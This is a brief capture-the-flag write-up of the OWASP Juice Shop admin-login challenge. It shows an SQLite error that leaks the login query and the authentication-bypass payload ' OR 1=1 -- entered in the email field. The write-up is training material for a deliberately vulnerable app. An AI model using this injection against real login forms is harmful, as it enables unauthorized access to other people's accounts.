The description of the next challenge essentially gave away this one:

> Log in with the administrator's user credentials without previously changing them or applying SQL Injection.

Placing a single `'` in the Email and anything in the Password results in the
following:

```
{"error":{"message":"SQLITE_ERROR: unrecognized token: \"098f6bcd4621d373cade4e832627b4f6\"","stack":"SequelizeDatabaseError: SQLITE_ERROR: unrecognized token: \"098f6bcd4621d373cade4e832627b4f6\"\n at Query.formatError (/juice-shop/node_modules/sequelize/lib/dialects/sqlite/query.js:423:16)\n at afterExecute (/juice-shop/node_modules/sequelize/lib/dialects/sqlite/query.js:119:32)\n at replacement (/juice-shop/node_modules/sqlite3/lib/trace.js:19:31)\n at Statement.errBack (/juice-shop/node_modules/sqlite3/lib/sqlite3.js:16:21)","name":"SequelizeDatabaseError","parent":{"errno":1,"code":"SQLITE_ERROR","sql":"SELECT * FROM Users WHERE email = ''' AND password = '098f6bcd4621d373cade4e832627b4f6'"},"original":{"errno":1,"code":"SQLITE_ERROR","sql":"SELECT * FROM Users WHERE email = ''' AND password = '098f6bcd4621d373cade4e832627b4f6'"},"sql":"SELECT * FROM Users WHERE email = ''' AND password = '098f6bcd4621d373cade4e832627b4f6'"}}
```

So we can be fairly sure it's an SQL injection. Trying `' OR 1=1 --` does the trick :)
